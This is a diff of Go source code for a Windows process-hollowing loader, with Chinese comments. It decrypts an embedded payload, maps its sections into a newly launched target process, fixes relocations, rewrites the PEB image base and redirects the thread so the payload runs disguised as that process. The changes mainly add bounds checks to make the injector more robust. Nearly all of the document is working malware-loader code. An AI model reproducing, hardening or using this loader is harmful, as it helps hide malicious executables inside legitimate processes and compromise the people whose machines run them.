@@ -32,15 +32,40 @@ func ExecuteAsync(targetPath string, payload []byte) (uint32, error) {
 }
 
 // 核心内部加载引擎
+// ⚠️ 架构警告：为了极致性能避免几百MB的深拷贝，executeInternal 会在 ASLR 重定位时
+// 原地修改 (污染) 传入的 payload 切片底层数组。
+// 调用方必须保证每次传入的都是独立的内存拷贝 (如 extractAndDecrypt 新分配的字节)，切勿缓存复用！
 func executeInternal(targetPath string, payload []byte, wait bool) (uint32, error) {
+	// 🌟 修复一：严谨的内存越界校验 (Bounds Checking) - DOS Header
+	if len(payload) < int(unsafe.Sizeof(IMAGE_DOS_HEADER{})) {
+		return 0, fmt.Errorf("payload is too small to contain DOS header")
+	}
+
 	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&payload[0]))
 	if dosHeader.E_magic != 0x5A4D {
 		return 0, fmt.Errorf("invalid DOS magic")
 	}
 
-	ntHeader := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(&payload[dosHeader.E_lfanew]))
+	// 🌟 修复一：严谨的内存越界校验 - NT Header
+	ntHeaderOffset := int(dosHeader.E_lfanew)
+	if ntHeaderOffset < 0 || ntHeaderOffset+int(unsafe.Sizeof(IMAGE_NT_HEADERS64{})) > len(payload) {
+		return 0, fmt.Errorf("invalid NT header offset or payload too small")
+	}
+
+	ntHeader := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(&payload[ntHeaderOffset]))
 	if ntHeader.Signature != 0x00004550 {
 		return 0, fmt.Errorf("invalid NT signature")
+	}
+
+	// 🌟 修复一：严谨的内存越界校验 - Section Headers
+	sectionHeaderOffset := uint32(ntHeaderOffset) +
+		4 + // PE Signature 大小
+		uint32(unsafe.Sizeof(ntHeader.FileHeader)) +
+		uint32(ntHeader.FileHeader.SizeOfOptionalHeader)
+
+	sectionsEndOffset := int(sectionHeaderOffset) + int(ntHeader.FileHeader.NumberOfSections)*int(unsafe.Sizeof(IMAGE_SECTION_HEADER{}))
+	if sectionsEndOffset > len(payload) {
+		return 0, fmt.Errorf("payload too small to contain all section headers")
 	}
 
 	targetPtr, _ := syscall.UTF16PtrFromString(targetPath)
@@ -78,7 +103,7 @@ func executeInternal(targetPath string, payload []byte, wait bool) (uint32, erro
 		uintptr(unsafe.Pointer(&returnLength)),
 	)
 
-	// 🌟 UPX 与 ASLR 双轨兼容核心修复：
+	// UPX 与 ASLR 双轨兼容核心修复：
 	var hostImageBase uint64
 	var bytesRead uintptr
 	procReadProcessMemory.Call(
@@ -120,12 +145,6 @@ func executeInternal(targetPath string, payload []byte, wait bool) (uint32, erro
 		return 0, fmt.Errorf("VirtualAllocEx failed")
 	}
 
-	// 🌟 修复一：严谨定位 Section Header，兼容 UPX 等裁剪掉部分数据目录表的程序
-	sectionHeaderOffset := uint32(dosHeader.E_lfanew) + 
-		4 + // PE Signature 大小
-		uint32(unsafe.Sizeof(ntHeader.FileHeader)) + 
-		uint32(ntHeader.FileHeader.SizeOfOptionalHeader)
-	
 	// 手工解析并修复 PE 重定位表 (Base Relocation)，对抗 ASLR (仅在 delta != 0 时执行)
 	rvaToOffset := func(rva uint32) uint32 {
 		for i := uint16(0); i < ntHeader.FileHeader.NumberOfSections; i++ {
@@ -140,26 +159,45 @@ func executeInternal(targetPath string, payload []byte, wait bool) (uint32, erro
 	delta := uint64(allocAddress) - payloadImageBase
 	
 	if delta != 0 {
-		// 🌟 修复二：同步将新的内存基址写回即将被映射的 PE 头结构中，防止程序内部寻址异常
+		// 同步将新的内存基址写回即将被映射的 PE 头结构中，防止程序内部寻址异常
 		ntHeader.OptionalHeader.ImageBase = uint64(allocAddress)
 
 		relocDir := ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
 		if relocDir.Size > 0 && relocDir.VirtualAddress > 0 {
 			relocRaw := rvaToOffset(relocDir.VirtualAddress)
 			relocEnd := relocRaw + relocDir.Size
+			
+			// 🌟 修复二：ASLR 重定位块的越界安全防御
+			if int(relocEnd) > len(payload) || int(relocRaw) < 0 {
+				return 0, fmt.Errorf("relocation table out of bounds")
+			}
+
 			for relocRaw < relocEnd {
+				if int(relocRaw)+8 > len(payload) {
+					break // 防止读取 Block Header 越界
+				}
+				
 				block := (*IMAGE_BASE_RELOCATION)(unsafe.Pointer(&payload[relocRaw]))
 				if block.SizeOfBlock == 0 {
 					break
 				}
+				
+				if int(relocRaw)+int(block.SizeOfBlock) > len(payload) {
+					break // 防止读取 Block 内容越界
+				}
+
 				count := (block.SizeOfBlock - 8) / 2
 				entries := (*[1 << 16]uint16)(unsafe.Pointer(&payload[relocRaw+8]))[:count:count]
 				for _, entry := range entries {
 					if (entry >> 12) == 10 { // IMAGE_REL_BASED_DIR64 (x64)
 						targetRVA := block.VirtualAddress + uint32(entry&0xFFF)
 						targetRaw := rvaToOffset(targetRVA)
-						val := (*uint64)(unsafe.Pointer(&payload[targetRaw]))
-						*val += delta // 动态修正偏移
+						
+						// 防止重定位指针写入越界，保障内存稳定
+						if int(targetRaw)+8 <= len(payload) && int(targetRaw) >= 0 {
+							val := (*uint64)(unsafe.Pointer(&payload[targetRaw]))
+							*val += delta // 动态修正偏移 (原地污染 Payload)
+						}
 					}
 				}
 				relocRaw += block.SizeOfBlock
@@ -182,13 +220,16 @@ func executeInternal(targetPath string, payload []byte, wait bool) (uint32, erro
 	for i := uint16(0); i < ntHeader.FileHeader.NumberOfSections; i++ {
 		sec := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(&payload[sectionHeaderOffset+uint32(i)*uint32(unsafe.Sizeof(IMAGE_SECTION_HEADER{}))]))
 		if sec.SizeOfRawData > 0 {
-			procWriteProcessMemory.Call(
-				uintptr(pi.Process),
-				allocAddress+uintptr(sec.VirtualAddress),
-				uintptr(unsafe.Pointer(&payload[sec.PointerToRawData])),
-				uintptr(sec.SizeOfRawData),
-				uintptr(unsafe.Pointer(&bytesWritten)),
-			)
+			// 🌟 修复三：防止抽取 Section 时由于异常的指针导致越界读取
+			if int(sec.PointerToRawData)+int(sec.SizeOfRawData) <= len(payload) && int(sec.PointerToRawData) >= 0 {
+				procWriteProcessMemory.Call(
+					uintptr(pi.Process),
+					allocAddress+uintptr(sec.VirtualAddress),
+					uintptr(unsafe.Pointer(&payload[sec.PointerToRawData])),
+					uintptr(sec.SizeOfRawData),
+					uintptr(unsafe.Pointer(&bytesWritten)),
+				)
+			}
 		}
 	}
 
@@ -228,8 +269,7 @@ func executeInternal(targetPath string, payload []byte, wait bool) (uint32, erro
 		}
 	}
 
-	// 🌟 核心修复：刷新指令缓存 (FlushInstructionCache)
-	// 在修改完所有内存权限准备执行前，强制令目标进程 CPU D-Cache 与 I-Cache 保持同步
+	// 核心修复：刷新指令缓存 (FlushInstructionCache)
 	procFlushInstructionCache.Call(uintptr(pi.Process), 0, 0)
 
 	// 使用安全封装好的对齐 Context
@@ -240,7 +280,7 @@ func executeInternal(targetPath string, payload []byte, wait bool) (uint32, erro
 	procGetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(alignCtx)))
 
 	var newImageBase = uint64(allocAddress)
-	// 将 PEB 中的 ImageBase 指向我们新的分配地址，系统 Loader 恢复后会自动帮我们加载导入表！
+	// 将 PEB 中的 ImageBase 指向我们新的分配地址，系统 Loader 恢复后会自动帮我们加载导入表
 	procWriteProcessMemory.Call(
 		uintptr(pi.Process),
 		pbi.PebBaseAddress+16,
